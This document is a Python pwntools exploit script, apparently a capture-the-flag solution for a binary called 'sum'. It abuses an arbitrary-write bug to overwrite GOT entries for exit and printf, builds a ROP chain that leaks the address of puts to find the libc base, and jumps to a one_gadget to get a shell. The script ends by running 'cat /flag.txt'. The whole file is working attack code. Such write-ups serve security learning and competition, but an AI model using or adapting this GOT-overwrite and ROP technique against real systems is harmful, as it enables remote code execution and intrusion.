from __future__ import division, print_function
import random
from pwn import *
from subprocess import *
from os import environ
context.log_level = logging.WARN

log = False
is_gaibu = True
if is_gaibu:
    host = environ['HOST']
    port = environ['PORT']
else:
    host = "127.0.0.1"
    port = 3001

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(s, verbose=True):
    s = r.recvuntil(s)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

#############################################################
#############################################################

binary = ELF('./files/sum')
main_addr = binary.symbols['main']
LEN = 5

def main(l):
    recvuntil('3 4 0\n')
    sendline(' '.join(map(str, l)))

def append_printf_to(l, addr):
    assert(len(l) == LEN - 1)
    s = sum(l)
    l.append(addr - binary.got['printf'] - s)
    l.append(binary.got['printf'])

def append_printf_to_main(l):
    append_printf_to(l, main_addr)

def append_exit_to(l, addr):
    assert(len(l) == LEN - 1)
    s = sum(l)
    l.append(addr - binary.got['exit'] - s)
    l.append(binary.got['exit'])

l = [3, -1, -1, -1,
       main_addr - binary.got['exit'],
       binary.got['exit']
    ]
main(l) # main loop


####
l = [3, -1, -1, -1]
append_printf_to_main(l)

pop_rdi = 0x00400a43
pop_rsi_r15 = 0x00400a41

pop7 = 0x00400a36
pop6 = 0x00400a3a
pop5 = 0x00400a3b
pop4 = 0x00400a3c
pop3 = 0x00400a3f
pop2 = 0x00400a40

#### libc_leak ####
'''
puts(binary.got['puts'])
'''
l = [
        pop_rdi,
        binary.got['puts'],
        binary.plt['puts'],
        binary.plt['printf'], # -> invokes main
        ]
append_printf_to(l, 0x400904) # avoid alignment problem
main(l)


def invoke_rop():
    l = [
            pop6, # -> invokes the above rop code
            pop6,
            pop6,
            pop6,
            ]
    append_exit_to(l, pop4)
    invoke_rop = l
    main(l)

invoke_rop()

s = recvline()
puts = just_u64(s)
libc_base = puts - 0x809c0

# print('libc_base:', hex(libc_base))

####  jump to one_gadget RCE ####

one_gadget = libc_base + 0x4f2c5
# one_gadget = libc_base + 0x4f322
# one_gadget = libc_base + 0x10a38c

l = [pop2, -one_gadget, -pop2, one_gadget]
append_exit_to(l, main_addr)
main(l)
wait_for_attach()
invoke_rop()

sendline('cat /flag.txt')
print(recvline())
